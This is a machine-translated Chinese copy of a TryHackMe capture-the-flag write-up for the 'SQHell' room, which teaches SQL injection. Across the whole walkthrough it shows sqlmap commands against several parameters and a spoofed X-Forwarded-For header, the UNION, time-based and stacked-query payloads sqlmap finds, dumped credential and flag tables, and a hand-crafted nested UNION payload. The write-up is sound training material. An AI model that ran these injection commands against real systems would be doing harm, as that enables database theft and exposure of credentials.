<html>
<head>
<title>TryHackMe Writeup — SQHell</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe Writeup — SQHell</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-sqhell-2dd7bd7f0990?source=collection_archive---------0-----------------------#2021-05-25">https://infosecwriteups.com/tryhackme-sqhell-2dd7bd7f0990?source=collection_archive---------0-----------------------#2021-05-25</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/7401190ba7fa994ac10baef82fa3cc2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/0*_-8Tp7L700TwYanP.jpeg"/></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">照片来自<a class="ae kb" href="https://tryhackme.com/room/sqhell#" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/sqhell</a></figcaption></figure><p id="0d69" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">大家好，又和TryHackMe玩得开心了。所以，这是通过这个<strong class="ke iu"> SQHell </strong>挑战的写作和故事指南。</p><p id="d312" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated"><strong class="ke iu">房间</strong>:<a class="ae kb" href="https://tryhackme.com/room/sqhell#" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/sqhell</a><br/><strong class="ke iu">级别</strong>:中等</p><p id="7606" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated"><strong class="ke iu">任务</strong>:尝试找到SQL注入中的所有标志</p><h1 id="79af" class="la lb it bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">我们开始吧</h1><p id="2fd3" class="pw-post-body-paragraph kc kd it ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz im bi translated">像往常一样，启动机器并在浏览器中打开IP</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi md"><img src="../Images/208773a4b1e895245056cf6c7b11e874.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6hFmdgUpQp5GcsHXIik50Q.png"/></div></div></figure><p id="ab07" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">那里有登录和注册页面。让我们先看看登录页面</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mm"><img src="../Images/e0ec96f8a64c8d6a7997532f90c26eeb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*01XpICZvKYF863NpC3rwIg.png"/></div></div></figure><p id="4d50" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">尝试使用简单的SQL注入和不工作。让我们使用<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>进行更深入的检查</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="3ae1" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u http://10.10.X.X/login --method=POST --data=username=admin&amp;password=admin -p username,password --risk=3 --level=3 --random-agent</span><span id="79f4" class="mv lb it mq b gy na mx l my mz">sqlmap identified the following injection point(s) with a total of 288 HTTP(s) requests:<br/>---<br/><strong class="mq iu">Parameter: username (POST)<br/>Type: boolean-based blind<br/>Title: OR boolean-based blind - WHERE or HAVING clause<br/>Payload: username=-6970' OR 4968=4968-- XSZT&amp;password=admin</strong></span><span id="e6f9" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: stacked queries<br/>Title: MySQL &gt;= 5.0.12 stacked queries (comment)<br/>Payload: username=admin';SELECT SLEEP(5)#&amp;password=admin</strong></span><span id="d5cc" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: time-based blind<br/>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>Payload: username=admin' AND (SELECT 5071 FROM (SELECT(SLEEP(5)))xYzy)-- Ncar&amp;password=admin</strong><br/>---<br/>web server operating system: Linux Ubuntu<br/>web application technology: Nginx 1.18.0<br/>back-end DBMS: MySQL &gt;= 5.0.12</span></pre><p id="082b" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">看来<code class="fe mn mo mp mq b"><strong class="ke iu">username</strong></code>字段容易受到几种sql注入方法的攻击。现在让我们看看数据库列表</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="646f" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/login" --method=POST --data="username=admin&amp;password=admin" -p "username,password" --risk=3 --level=3 --random-agent --dbs --threads 10</span><span id="4383" class="mv lb it mq b gy na mx l my mz">...<br/>available databases [2]:<br/>[*] <strong class="mq iu">information_schema</strong><br/>[*] <strong class="mq iu">sqhell_2</strong></span></pre><p id="a056" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">只需将所有数据转储到数据库sqhell_2下</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="b9da" class="mv lb it mq b gy mw mx l my mz">sqlmap -u "http://10.10.X.X/login" --method=POST --data="username=admin&amp;password=admin" -p "username,password" --risk=3 --level=3 --random-agent -D sqhell_2 --dump-all --threads 10</span><span id="f53f" class="mv lb it mq b gy na mx l my mz">...<br/>...<br/><strong class="mq iu">Database: sqhell_2<br/>Table: users<br/>[1 entry]<br/>+----+----------+---------------------------------+<br/>| id | username | password                        |<br/>+----+----------+---------------------------------+<br/>| 1  | admin    | icantrememberthisXXXXXXXXXXXXXX |<br/>+----+----------+---------------------------------+</strong><br/>...<br/>...</span></pre><p id="3cb2" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">我们开始吧，使用暴露的凭证登录</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi nb"><img src="../Images/54538cda134e5a5164ae3beb1735d9d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kXyNk-G-AV0RpNEORH9m9g.png"/></div></div></figure><p id="815b" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">找到第一面旗了！。让我们寻找下一面旗帜。让我们检查注册页面。在检查用户名可用性时，存在一个Ajax请求。让我们先检查一下</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="6eab" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/register/user-check?username=admin2" -p "username" --risk=3 --level=3 --dbs --dbms=mysql --threads 10</span><span id="9174" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">available databases [2]:<br/>[*] information_schema<br/>[*] sqhell_3</strong></span></pre><p id="0977" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">哦！存在另一个表。转储数据库</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="a447" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/register/user-check?username=admin" -p "username" --risk=3 --level=3 -D sqhell_3 --dump-all --dbms=mysql --threads 10</span><span id="83ea" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_3</strong><br/><strong class="mq iu">Table: flag<br/></strong>[1 entry]<br/>+----+---------------------------------------------+<br/>| id | flag                                        |<br/>+----+---------------------------------------------+<br/><strong class="mq iu">| 1  | THM{FLAG3:97AEB3B28A486441XXXXXXXXXXXXXXXX} |<br/></strong>+----+---------------------------------------------+</span><span id="6049" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_3</strong><br/><strong class="mq iu">Table: users<br/></strong>[1 entry]<br/>+----+----------+---------------------------------+<br/>| id | username | password                        |<br/>+----+----------+---------------------------------+<br/><strong class="mq iu">| 1  | admin    | icantrememberthispassXXXXXXXXXX |<br/></strong>+----+----------+---------------------------------+</span></pre><p id="7155" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">找到旗子了。实际上是3号旗。但是没关系。我们去找其他人吧。</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi nc"><img src="../Images/4d8da9b5aa9de8ced06d1196f1d4d763.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Dhqdx4kveCw58T4ZykeZGA.png"/></div></div></figure><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="0c5b" class="mv lb it mq b gy mw mx l my mz">http://10.10.X.X/post?<strong class="mq iu">id</strong>=2</span></pre><p id="7559" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">我忘了点击“阅读更多”链接。看来还有另一个查询参数可供brute使用。让我们试试</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8dc4" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/post?id=2" -p "id" --risk=3 --level=3 --dbs --dbms=mysql --threads 10</span><span id="e671" class="mv lb it mq b gy na mx l my mz">sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:<br/>---<br/>Parameter: id (GET)<br/><strong class="mq iu">Type: boolean-based blind</strong><br/>Title: AND boolean-based blind - WHERE or HAVING clause<br/>Payload: id=2 AND 3791=3791</span><span id="f159" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: error-based</strong><br/>Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)<br/>Payload: id=2 AND GTID_SUBSET(CONCAT(0x71706a7071,(SELECT (ELT(9206=9206,1))),0x716b7a6b71),9206)</span><span id="0b2f" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: stacked queries</strong><br/>Title: MySQL &gt;= 5.0.12 stacked queries (comment)<br/>Payload: id=2;SELECT SLEEP(5)#</span><span id="4d9e" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: time-based blind</strong><br/>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>Payload: id=2 AND (SELECT 3078 FROM (SELECT(SLEEP(5)))ERZk)</span><span id="c537" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: UNION query</strong><br/>Title: Generic UNION query (NULL) - 4 columns<br/>Payload: id=-6926 UNION ALL SELECT NULL,CONCAT(0x71706a7071,0x4c474b6e4f55716e4557424a686c4d755a564f6a4c58625550634774787947517541666b5a4e674b,0x716b7a6b71),NULL,NULL-- -<br/>---<br/>....<br/>....</span><span id="0f4e" class="mv lb it mq b gy na mx l my mz">available databases [2]:<br/>[*] information_schema<br/><strong class="mq iu">[*] sqhell_5</strong></span></pre><p id="ff0d" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">好了，现在又有一个新的数据库可用了</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="e6d0" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/post?id=2" -p "id" --risk=3 --level=3 -D sqhell_5 --dump-all --dbms=mysql --threads 10</span><span id="f5ce" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_5</strong><br/>Table: flag<br/>[1 entry]<br/>+----+---------------------------------------------+<br/>| id | flag                                        |<br/>+----+---------------------------------------------+<br/><strong class="mq iu">| 1  | THM{FLAG5:B9C690D3B914F7038BA1FC6XXXXXXXXX} |<br/></strong>+----+---------------------------------------------+</span><span id="69b0" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_5</strong><br/>Table: posts<br/>[1 entry]<br/>+----+----------+-------------+----------+<br/>| id | user_id  |   name      | content  |<br/>+----+----------+-------------+----------+<br/><strong class="mq iu">| 1  | 1        | First Post  | XXXXXXXX |<br/>+----+----------+-------------+----------+<br/>| 2  | 1        | Second Post | XXXXXXXX |</strong><br/>+----+----------+-------------+----------+</span><span id="71dc" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_5</strong><br/>Table: users<br/>[1 entry]<br/>+----+----------+----------+<br/>| id | username | password |<br/>+----+----------+----------+<br/><strong class="mq iu">| 1  | admin    | XXXXXXXX |</strong><br/>+----+----------+----------+</span></pre><p id="43f5" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">找到旗子了，是第五面旗..😅第二面和第四面旗帜在哪里🤔。让我们看看博文的作者</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi nd"><img src="../Images/dc1e479fbffe916c9a499ccc14332669.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ONGGxH1psaTApa2dKAVDXQ.png"/></div></div></figure><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="30a0" class="mv lb it mq b gy mw mx l my mz"><a class="ae kb" href="http://10.10.135.78/user?id=1" rel="noopener ugc nofollow" target="_blank">http://10.10.135.78/user?id=1</a></span></pre><p id="a0ed" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">从用户作者中找到另一个参数。让我们试试吧</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8596" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/user?id=1" -p "id" --risk=3 --level=3 --dbs --dbms=mysql --threads 10</span><span id="e980" class="mv lb it mq b gy na mx l my mz">available databases [2]:<br/>[*] information_schema<br/><strong class="mq iu">[*] sqhell_4</strong></span></pre><p id="38eb" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">好了，现在又有一个新的数据库可用了</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="849e" class="mv lb it mq b gy mw mx l my mz">Database: <strong class="mq iu">sqhell_4</strong></span><span id="b80d" class="mv lb it mq b gy na mx l my mz">Table: users<br/>[1 entry]<br/>+----+----------+----------+<br/>| id | username | password |<br/>+----+----------+----------+<br/>| 1  | admin    | password |<br/>+----+----------+----------+</span></pre><p id="a0c9" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">但是这个数据库中只有一个表。🤔让我们看看提示</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi ne"><img src="../Images/6ec12235f84e198429dc7334ed58a048.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3kdZsNE-zcYYJJAY_-1TGg.png"/></div></div></figure><p id="b305" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">上面写着“我们出于分析目的记录你的IP地址”。可能是系统从请求中获取IP地址并保存到数据库中。根据使用PHP的经验，<code class="fe mn mo mp mq b"><strong class="ke iu">X-Fowarded-For</strong></code>头是用来记录用户IP地址的。那么，让我们注射到头部，</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8609" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 --dbs --time-sec=1</span><span id="544d" class="mv lb it mq b gy na mx l my mz">---<br/>Parameter: X-forwarded-for #1* ((custom) HEADER)<br/><strong class="mq iu">Type: stacked queries</strong><br/>Title: MySQL &gt;= 5.0.12 stacked queries (comment)<br/>Payload: 1';SELECT SLEEP(1)#</span><span id="a59d" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: time-based blind</strong><br/>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>Payload: 1' AND (SELECT 5673 FROM (SELECT(SLEEP(1)))rCnJ)-- INff<br/>---</span><span id="f629" class="mv lb it mq b gy na mx l my mz">available databases [2]:<br/>[*] information_schema<br/>[*] <strong class="mq iu">sqhell_1</strong></span></pre><p id="ddf6" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">它的时基盲SQL注入类型。这可能需要一段时间，因为它是基于时间的。默认情况下<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>用了2秒。只需将命令调整为1秒，使其更快。现在，把所有的桌子都倒在<code class="fe mn mo mp mq b"><strong class="ke iu">sqhell_1</strong></code>里面</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="3206" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 -D <strong class="mq iu">sqhell_1</strong> --tables --dump-all --time-sec=1</span><span id="41d4" class="mv lb it mq b gy na mx l my mz">Database: sqhell_1<br/>Table: flag<br/>[1 entry]<br/>+----+---------------------------------------------+<br/>| id | flag                                        |<br/>+----+---------------------------------------------+<br/><strong class="mq iu">| 1  | THM{FLAG2:C678ABFE1C01FCA19E039XXXXXXXXXXX} |<br/></strong>+----+---------------------------------------------+</span><span id="8df1" class="mv lb it mq b gy na mx l my mz">Database: sqhell_1<br/>Table: hits<br/>[0 entries]<br/>+----+----+---------+<br/>| id | ip | count   |<br/>+----+----+---------+<br/>+----+----+---------+</span></pre><p id="cc8f" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">好吧！找到第二面旗帜了！..现在是4号！</p><p id="fa24" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">再次参考数据库<code class="fe mn mo mp mq b"><strong class="ke iu">sqhell_4</strong></code>。当检查信息模式时，实际上有另一个表，但它没有出现在<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>扫描中</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="9a3c" class="mv lb it mq b gy mw mx l my mz">Database: information_schema</span><span id="2689" class="mv lb it mq b gy na mx l my mz">Table: INNODB_DATAFILES</span><span id="603b" class="mv lb it mq b gy na mx l my mz">[34 entries]<br/>+-----------------------------------------+------------+<br/>| PATH                                    | SPACE      |<br/>+-----------------------------------------+------------+<br/>...<br/>...<br/><strong class="mq iu">| ./sqhell_4/flag.ibd                     | 42         |<br/>| ./sqhell_4/posts.ibd                    | 43         |</strong><br/>| ./sqhell_4/users.ibd                    | 44         |<br/>...<br/>...<br/>+-----------------------------------------+------------+</span></pre><p id="4a88" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">太奇怪了😵‍💫有点难。它不会从<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>扫描出来。</p><p id="bec8" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">如果我们测试admin:password来使用这个用户密码登录mysql怎么样？</p><p id="86a8" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">没有。失败~~</p><p id="18f5" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">宋承宪怎么样？？</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="42ad" class="mv lb it mq b gy mw mx l my mz">ssh admin@10.10.X.X<br/>....<br/>Permission denied (publickey).<br/>....</span></pre><p id="02b9" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">呃！！..哈哈的笑..这个CTF只是关注SQL注入。可能是另一种方式</p><p id="b217" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">如果谷歌搜索提示，它指的是盗梦空间电影。</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi nf"><img src="../Images/a2a2619b591af1b78305300acbe268a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4DC9Ru4XyDvp-9YUPB_rAA.png"/></div></div></figure><p id="499a" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">这可能是个暗示。这里发生了一些奇怪的事情。关于不和谐的讨论，需要手动查找。因此..，让我们用更详细的级别再次查找注入类型</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8098" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/user?id=5000" --risk=3 --level=5 --dbms=mysql --threads=10 --random-agent --dbs -v 3</span><span id="1d7e" class="mv lb it mq b gy na mx l my mz">....<br/>....<br/>---<br/>Parameter: id (GET)<br/><strong class="mq iu">Type: time-based blind<br/></strong>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>Payload: id=5000 AND (SELECT 3646 FROM (SELECT(SLEEP(5)))FYCC)<br/><strong class="mq iu">Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</strong></span><span id="3127" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: UNION query</strong><br/>Title: Generic UNION query (NULL) - 3 columns<br/>Payload: id=5000 UNION ALL SELECT NULL,CONCAT(0x716b6a7171,0x4872555953536f506570474e616b55584968664f71507872784d756a5a6e487a4646565555654845,0x7178787071),NULL-- -<strong class="mq iu">Vector: UNION ALL SELECT NULL,[QUERY],NULL-- -</strong><br/>---<br/>....<br/>....</span></pre><p id="a9ba" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">使用上面的联合向量示例，在几个小时的尝试和错误之后，填充查询以访问从<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>无法访问的<code class="fe mn mo mp mq b"><strong class="ke iu">flag</strong></code>表</p><p id="5a90" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">烹饪查询后的最终结果:</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8191" class="mv lb it mq b gy mw mx l my mz">5000 UNION ALL SELECT "5000 UNION SELECT flag,flag,flag,flag from flag-- -",5000,5000 from users-- -</span></pre><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mm"><img src="../Images/9555ba6923cd4b72ada08f7f2631dd69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lEFPystAfDgcaYJzv_F_DQ.png"/></div></div></figure><p id="db19" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">嘣！~~~任务完成。</p></div><div class="ab cl ng nh hx ni" role="separator"><span class="nj bw bk nk nl nm"/><span class="nj bw bk nk nl nm"/><span class="nj bw bk nk nl"/></div><div class="im in io ip iq"><p id="6376" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">感谢您的阅读，让我们来看看另一篇文章。🤘</p></div></div>    
</body>
</html>